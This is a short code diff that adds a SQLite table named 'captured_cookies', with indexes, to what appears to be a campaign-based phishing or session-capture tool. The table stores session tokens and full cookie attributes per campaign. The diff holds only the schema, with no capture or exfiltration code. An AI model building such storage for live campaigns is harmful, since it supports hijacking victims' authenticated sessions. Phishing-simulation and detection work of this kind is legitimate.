@@ -320,6 +320,42 @@ db.serialize(() => {
     )
   `);
 
+  // Create captured cookies table for real-time cookie storage
+  db.run(`
+    CREATE TABLE IF NOT EXISTS captured_cookies (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      campaign_id INTEGER NOT NULL,
+      session_token TEXT NOT NULL,
+      cookie_name TEXT NOT NULL,
+      cookie_value TEXT,
+      domain TEXT,
+      path TEXT DEFAULT '/',
+      expiration_date INTEGER,
+      secure INTEGER DEFAULT 0,
+      http_only INTEGER DEFAULT 0,
+      same_site TEXT,
+      host_only INTEGER DEFAULT 1,
+      session INTEGER DEFAULT 1,
+      original_cookie TEXT,
+      first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
+      last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
+      is_active INTEGER DEFAULT 1,
+      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE,
+      UNIQUE(session_token, cookie_name, domain, path)
+    )
+  `);
+
+  // Create index for faster cookie lookups
+  db.run(`
+    CREATE INDEX IF NOT EXISTS idx_cookies_session 
+    ON captured_cookies(session_token, is_active)
+  `);
+
+  db.run(`
+    CREATE INDEX IF NOT EXISTS idx_cookies_campaign 
+    ON captured_cookies(campaign_id, is_active)
+  `);
+
   // Log table creation success
   console.log('Tracking tables initialized');
 });
